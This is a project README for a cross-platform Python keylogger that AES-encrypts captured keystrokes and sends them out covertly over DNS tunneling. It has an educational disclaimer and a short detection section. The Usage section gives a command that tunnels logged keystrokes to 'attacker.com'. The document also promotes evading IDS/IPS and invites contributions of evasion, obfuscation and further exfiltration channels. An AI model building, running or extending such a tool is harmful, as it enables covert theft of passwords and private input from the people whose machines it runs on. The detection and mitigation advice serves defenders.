# Keylogger with Encrypted DNS Tunneling Exfiltration

A cross-platform Python-based keystroke logging tool with AES encryption and DNS tunneling for secure data exfiltration. **Educational & Research Purpose Only.**

---

## ⚠️ Legal & Ethical Disclaimer

This tool is provided **strictly for educational, authorized security research, and authorized penetration testing purposes**. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) and similar regulations worldwide.

**Usage of this tool without explicit written permission from the system owner is illegal and unethical.** The author assumes no liability for misuse. Users are solely responsible for compliance with all applicable laws and regulations.

---

## 📋 Project Overview

This project demonstrates **core cybersecurity concepts** through practical implementation:
- **Keystroke logging**: Captures user input across platforms
- **Encryption**: Secures sensitive data in transit and at rest using AES-256
- **Covert exfiltration**: DNS tunneling bypasses traditional network monitoring
- **Cross-platform compatibility**: Works on Windows and Linux environments

**Educational Value**: Understand how attackers operate, detection methods, and defensive strategies.

---

## ✨ Features

### Core Functionality
- **Keystroke Logging**: Captures all keyboard input, including special keys (Shift, Ctrl, Alt, Enter, etc.)
- **AES-256 Encryption**: Encrypted logs are stored locally before exfiltration
- **DNS Tunneling Exfiltration**: Uses DNS queries to covertly transmit encrypted data
- **Cross-Platform Support**: Runs on Windows (x86/x64) and Linux systems
- **Minimal Footprint**: Lightweight design to reduce system resource usage

### Technical Highlights
- Uses `pynput` for platform-independent keystroke capture
- Implements `cryptography` library for military-grade AES encryption
- Leverages `iodine` for DNS tunneling protocol
- Modular architecture for easy customization

---

## 🔧 Installation

### Prerequisites
- **Python 3.6+** (tested on 3.8–3.11)
- **pip** package manager
- **Linux/Windows OS**
- Administrator/root privileges (required for keystroke capture)

### Step-by-Step Setup

#### 1. Clone the Repository
```bash
git clone https://github.com/skc237/Keylogger.git
cd Keylogger
```

#### 2. Install Python Dependencies
```bash
pip install -r requirements.txt
```

Or manually install:
```bash
pip install pynput cryptography dnspython
```

#### 3. Install System-Level Dependencies

**Linux:**
```bash
sudo apt-get update
sudo apt-get install iodine build-essential
```

**Windows:**
- Download `iodine` binaries from [iodine releases](https://github.com/ambrop7/iodine)
- Add to system PATH or place in project directory

#### 4. DNS Tunneling Setup (Optional)
- Set up an authoritative DNS server or use a tunnel service (e.g., `iodine`)
- Configure DNS domain for exfiltration (requires domain ownership)

---

## 🚀 Usage

### Basic Keystroke Logging
```bash
# Requires elevated privileges
sudo python3 keylogger.py
```

### With Encryption (Default)
```bash
# Logs are automatically encrypted with AES-256
sudo python3 keylogger.py --encrypt
```

### DNS Tunneling Exfiltration
```bash
# Configure DNS server and domain first
sudo python3 keylogger.py --encrypt --dns-tunnel --domain attacker.com
```

### Output
- **Encrypted logs**: Stored in `./logs/encrypted/` 
- **Key file**: `./logs/encryption_key.key` (keep secure!)
- **Decryption**: Use `decrypt_logs.py` with valid key

---

## 🔐 Security Architecture

### Keystroke Capture
- Uses `pynput.listener.Listener` for non-blocking key monitoring
- Captures key names and timestamps for forensic analysis
- Minimal performance impact (<2% CPU, <10MB RAM)

### Encryption Pipeline
```
Keystroke → Buffer → AES-256 Encrypt → Local Storage → DNS Tunnel → Remote Server
```

- **Algorithm**: AES-256 in CBC mode
- **Key Management**: Randomly generated 256-bit keys (stored securely)
- **IV Handling**: Unique initialization vector per encryption session

### DNS Tunneling
- Encodes encrypted data into DNS query names
- Uses `iodine` for reliable, low-bandwidth exfiltration
- Bypasses typical IDS/IPS detection (DNS is rarely blocked)
- Data reconstruction at remote DNS server

---

## 📊 Performance & Limitations

### Tested Performance
| Metric | Result |
|--------|--------|
| Keystroke Capture Rate | 100% (all keys logged) |
| Encryption Overhead | <50ms per batch |
| Memory Usage | 8–15 MB (steady state) |
| DNS Tunnel Bandwidth | ~200 bytes/min (typical usage) |

### Known Limitations
- **Privilege Requirement**: Admin/root needed for system-wide keystroke capture
- **GUI Limitations**: Some proprietary input methods may not be captured
- **DNS Setup Complexity**: Requires domain control and DNS server setup
- **Antivirus Detection**: Modern AV solutions flag keyloggers; use caution
- **USB Execution** (Future): Auto-execution on device insertion not yet implemented

---

## 🛡️ Defense & Detection

### How to Detect Keyloggers
1. **Process Monitoring**: Look for unusual `pynput` or DNS query patterns
2. **Network Analysis**: Monitor DNS traffic for unusual tunneling patterns
3. **Filesystem Auditing**: Check for suspicious log files in `/tmp`, `%APPDATA%`
4. **EDR/SIEM**: Configure rules to alert on keystroke capture libraries
5. **Code Inspection**: Review running processes with `ps` / Task Manager

### Mitigation Strategies
- Use **multi-factor authentication** (keyloggers can't defeat MFA tokens)
- Enable **keyboard monitoring alerts** in EDR solutions
- Use **encrypted messaging** for sensitive communications
- Employ **application whitelisting** to prevent unauthorized tools
- Monitor **DNS exfiltration** with tools like `Zeek`, `Suricata`

---

## 🔬 Educational Use Cases

This project is suitable for:
- **Security Research**: Understanding keystroke logging mechanisms
- **Incident Response Training**: Recognizing and responding to keylogger indicators
- **Penetration Testing**: Authorized security testing with proper consent
- **Malware Analysis**: Reverse-engineering techniques and detection signatures
- **Purple Team Exercises**: Simulating attacks for defensive training

---

## 🤝 Contributing

This is an **educational project**. Contributions for legitimate security research are welcome:
1. Add detection evasion techniques (for research)
2. Improve encryption/obfuscation
3. Enhance documentation and use cases
4. Add more exfiltration channels (HTTPS, ICMP, etc.)

**Please ensure all contributions are for authorized, ethical purposes.**

---

## 📚 References & Further Reading

- **Keystroke Logging**: [MITRE ATT&CK - T1056.001](https://attack.mitre.org/techniques/T1056/001/)
- **DNS Exfiltration**: [MITRE ATT&CK - T1048.003](https://attack.mitre.org/techniques/T1048/003/)
- **AES Encryption**: [NIST SP 800-38A (CBC Mode)](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf)
- **Iodine Project**: [GitHub - ambrop7/iodine](https://github.com/ambrop7/iodine)
- **Python pynput**: [Documentation](https://pynput.readthedocs.io/)

---

## ⚖️ License

This project is provided **for educational purposes**. By using this software, you agree to comply with all applicable laws and regulations.

---

## 📧 Contact & Support

For questions, feedback, or responsible security disclosures:
- GitHub Issues: [Report a security issue](https://github.com/skc237/Keylogger/security)
- Email: `shivansh.chourasiya67@gmail.com`

---

## 🎓 Conclusion

This project demonstrates how **practical cybersecurity knowledge** can be applied to understand real-world attack vectors. Use responsibly, ethically, and legally.

**Remember: With great power comes great responsibility.**
